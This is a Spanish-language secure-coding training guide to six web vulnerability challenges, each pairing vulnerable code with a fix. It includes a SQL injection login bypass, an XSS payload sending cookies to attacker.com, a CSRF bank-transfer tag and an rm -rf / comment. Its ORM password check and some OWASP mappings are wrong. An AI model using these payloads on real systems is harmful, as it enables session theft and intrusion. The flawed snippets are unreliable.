# 🎯 Desafíos Disponibles - Guía Completa

## 📊 Matriz de Desafíos

| # | Nombre | Nivel | CVSS | OWASP | CWE | Tiempo Est. |
|---|--------|-------|------|-------|-----|------------|
| 1 | SQL Injection - Básico | 🌱 Principiante | 9.8 | A01:2021 | CWE-89 | 15-20 min |
| 2 | XSS - Stored | 🌱 Principiante | 7.1 | A03:2021 | CWE-79 | 15-20 min |
| 3 | Broken Authentication | 🌱 Principiante | 9.1 | A07:2021 | CWE-287 | 20-25 min |
| 4 | CSRF | 🌿 Intermedio | 8.1 | A01:2021 | CWE-352 | 20-25 min |
| 5 | IDOR | 🌿 Intermedio | 8.2 | A01:2021 | CWE-639 | 20-25 min |
| 6 | Serialización Insegura | 🚀 Avanzado | 10.0 | A08:2021 | CWE-502 | 25-30 min |

---

## 🎓 Desafío 1: SQL Injection - Básico

### 📋 Descripción
La inyección de SQL permite a atacantes manipular consultas de base de datos. Es la vulnerabilidad más común y peligrosa.

### 🎯 Objetivos de Aprendizaje
- Entender cómo funciona SQL Injection
- Identificar código vulnerable
- Implementar prepared statements
- Usar ORMs de forma segura

### 🔴 Código Vulnerable
```python
def login_user(email, password):
    query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
    result = db.execute(query)
    return result.fetchone()
```

**Problema**: Las variables se concatenan directamente en la consulta SQL

### ⚙️ Ataque Ejemplo
```
Email: admin@example.com' OR '1'='1
Password: anything

Resultado:
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = 'anything'

Esto retorna TODOS los usuarios! 🚨
```

### 🟢 Código Seguro
```python
def login_user(email, password):
    query = "SELECT * FROM users WHERE email = ? AND password = ?"
    result = db.execute(query, (email, password))
    return result.fetchone()

# O mejor aún, con ORM:
user = db.query(User).filter(
    User.email == email,
    User.password == bcrypt.hashpw(password.encode())
).first()
```

### 💡 Pistas Progresivas
1. **Pista 1**: Busca "prepared statements" o "parameterized queries"
2. **Pista 2**: Los symbols `?` y `%s` son placeholders seguros
3. **Pista 3**: Los ORMs (SQLAlchemy, Django ORM) lo hacen automáticamente

### 🛡️ Contramedidas
- Use prepared statements/parameterized queries
- Valide entrada de usuarios
- Aplique principio de menor privilegio en BD
- WAF (Web Application Firewall)
- Logging y monitoreo

### 📚 Referencias
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

## 🎓 Desafío 2: Cross-Site Scripting (XSS) - Stored

### 📋 Descripción
XSS permite inyectar código JavaScript malicioso que se ejecuta en navegadores de otros usuarios.

### 🎯 Objetivos de Aprendizaje
- Entender tipos de XSS (Stored, Reflected, DOM-based)
- Escapar HTML correctamente
- Usar funciones seguras en frameworks
- Implementar Content Security Policy

### 🔴 Código Vulnerable
```javascript
// React - VULNERABLE
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// O en HTML vanilla:
document.getElementById('comment').innerHTML = userInput;
```

### ⚙️ Ataque Ejemplo
```html
Comentario:
<img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">

Resultado: Se roban las cookies de sesión!
```

### 🟢 Código Seguro
```javascript
// React - SEGURO (por defecto)
function Comment({ text }) {
    return <div>{text}</div>;  // React escapa automáticamente
}

// O explícitamente:
import DOMPurify from 'dompurify';
function Comment({ text }) {
    return <div>
        {DOMPurify.sanitize(text)}
    </div>;
}

// HTML - SEGURO:
document.getElementById('comment').textContent = userInput;  // Nunca innerHTML
```

### 💡 Pistas Progresivas
1. **Pista 1**: Escapa HTML convierte `<` a `&lt;`, `>` a `&gt;`
2. **Pista 2**: React escapa automáticamente en `{variables}`
3. **Pista 3**: `dangerouslySetInnerHTML` es la excepción, es peligrosa

### 🛡️ Contramedidas
- Escapar salida HTML
- Content Security Policy (CSP) headers
- HttpOnly cookies
- SameSite cookies
- Validación de entrada

### 📚 Referencias
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## 🎓 Desafío 3: Broken Authentication

### 📋 Descripción
Fallos en autenticación permiten acceso no autorizado a cuentas de usuario.

### 🎯 Objetivos de Aprendizaje
- Passwords fuertes
- Hashing seguro (bcrypt)
- Multi-Factor Authentication
- Rate limiting
- Session management

### 🔴 Código Vulnerable
```python
import hashlib

def register_user(username, password):
    # VULNERABLE: Sin validación, hash débil
    hashed = hashlib.sha1(password.encode()).hexdigest()
    db.add(User(username=username, password_hash=hashed))

def login_attempt(username, password):
    # VULNERABLE: Sin rate limiting
    user = db.query(User).filter(User.username == username).first()
    if user and user.password_hash == hashlib.sha1(password.encode()).hexdigest():
        return generate_session(user)
```

### ⚙️ Ataques Ejemplo
1. **Fuerza Bruta**: Intenta millones de contraseñas
2. **Diccionario**: Usa palabras comunes
3. **Rainbow Tables**: Usa tablas de hashes precalculados
4. **Credenciales por Defecto**: admin/admin

### 🟢 Código Seguro
```python
import bcrypt
import re

def register_user(username, password):
    # Validar contraseña fuerte
    if len(password) < 12:
        raise ValueError("Min 12 caracteres")
    if not re.search(r'[!@#$%^&*]', password):
        raise ValueError("Debe tener especiales")
    
    # Hash seguro
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
    db.add(User(username=username, password_hash=hashed))

def check_rate_limiting(username):
    attempts = db.query(LoginAttempt).filter(
        LoginAttempt.username == username,
        LoginAttempt.timestamp > datetime.utcnow() - timedelta(minutes=1)
    ).count()
    
    if attempts >= 5:
        raise Exception("Demasiados intentos")

def login_attempt(username, password):
    check_rate_limiting(username)
    
    user = db.query(User).filter(User.username == username).first()
    if user and bcrypt.checkpw(password.encode(), user.password_hash):
        send_mfa_code(user.email)  # MFA
        return {"status": "mfa_required"}
```

### 💡 Pistas Progresivas
1. **Pista 1**: bcrypt es diseñado para contraseñas, SHA1 no
2. **Pista 2**: Rate limiting: máximo 5 intentos/minuto
3. **Pista 3**: MFA es obligatorio (SMS, Authenticator)

### 🛡️ Contramedidas
- Passwords fuertes (12+ caracteres)
- Hashing seguro (bcrypt, scrypt, argon2)
- Multi-Factor Authentication
- Rate limiting
- Account lockout
- Password reset seguro

### 📚 Referencias
- OWASP: https://owasp.org/www-project-authentication-cheat-sheet/
- NIST 800-63B: Autenticación

---

## 🎓 Desafío 4: CSRF (Intermedio)

### 📋 Descripción
Falsificación de solicitud entre sitios permite ejecutar acciones sin consentimiento del usuario.

### 🎯 Objetivos de Aprendizaje
- CSRF tokens
- SameSite cookies
- Origin/Referer validation
- POST vs GET

### 🎨 Arquitectura
```
Atacante compra ads en attacker.com
↓
Código malicioso ejecuta:
<img src="https://bank.com/transfer?to=attacker&amount=1000">
↓
El navegador envía cookies automáticamente
↓
La transferencia se ejecuta sin consentimiento
```

### 🟢 Solución
```python
# Backend
from csrf import generate_csrf_token, validate_csrf_token

@app.post("/transfer")
def transfer_money(to: str, amount: float, csrf_token: str):
    if not validate_csrf_token(csrf_token):
        raise HTTPException(status_code=403, detail="Invalid CSRF token")
    # ... transfer ...

# Frontend
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input name="to" placeholder="Destinatario">
    <input name="amount" placeholder="Cantidad">
    <button>Transferir</button>
</form>

# Cookies seguras
response.set_cookie("session", value, samesite="Strict")
```

---

## 🎓 Desafío 5: IDOR (Intermedio)

### 📋 Descripción
Referencias Directas Inseguras a Objetos permite acceso a recursos de otros usuarios.

### 🔴 Código Vulnerable
```python
@app.get("/user/{user_id}/profile")
def get_user_profile(user_id: int):
    # VULNERABLE: No valida que sea el mismo usuario
    user = db.query(User).filter(User.id == user_id).first()
    return user
```

### 🟢 Código Seguro
```python
@app.get("/user/{user_id}/profile")
def get_user_profile(user_id: int, current_user = Depends(get_current_user)):
    # SEGURO: Valida autorización
    if current_user.id != user_id:
        raise HTTPException(status_code=403, detail="Not authorized")
    
    user = db.query(User).filter(User.id == user_id).first()
    return user
```

---

## 🎓 Desafío 6: Serialización Insegura (Avanzado)

### 📋 Descripción
Deserialización de datos no seguros puede ejecutar código arbitrario.

### 🔴 Código Vulnerable (Python Pickle)
```python
import pickle

# VULNERABLE: RCE posible
data = request.data
obj = pickle.loads(data)

# Un atacante crea payload que ejecuta:
# import os; os.system('rm -rf /')
```

### 🟢 Código Seguro
```python
import json
import jsonschema

USER_SCHEMA = {
    "type": "object",
    "properties": {
        "name": {"type": "string"},
        "email": {"type": "string"}
    },
    "required": ["name", "email"]
}

def deserialize_user(data):
    user_data = json.loads(data)
    jsonschema.validate(user_data, USER_SCHEMA)
    return user_data
```

---

## 🎓 Ruta de Aprendizaje Recomendada

### Semana 1-2: Fundamentos
1. Completa desafío 1: SQL Injection
2. Completa desafío 2: XSS
3. Completa desafío 3: Broken Auth

### Semana 3: Intermedio
4. Completa desafío 4: CSRF
5. Completa desafío 5: IDOR

### Semana 4: Avanzado
6. Completa desafío 6: Serialización

---

## 🏆 Tips para Completar Desafíos

✅ Lee TODAS las explicaciones
✅ Analiza ambos códigos (vulnerable vs seguro)
✅ Intenta resolver sin pistas primero
✅ Si estás atrapado, solicita una pista
✅ Estudia las pistas cuidadosamente
✅ Intenta nuevamente
✅ Analiza la solución cuando aciertes
✅ Practica el concepto en código real

---

## 📊 Estadísticas Globales

Después de completar todos los desafíos:
- ✅ Habrás cubierto 50% de OWASP Top 10
- ✅ Entenderás vulnerabilidades reales
- ✅ Podrás escribir código más seguro
- ✅ Estarás listo para seguridad avanzada

¡Felicidades por aprender seguridad! 🛡️
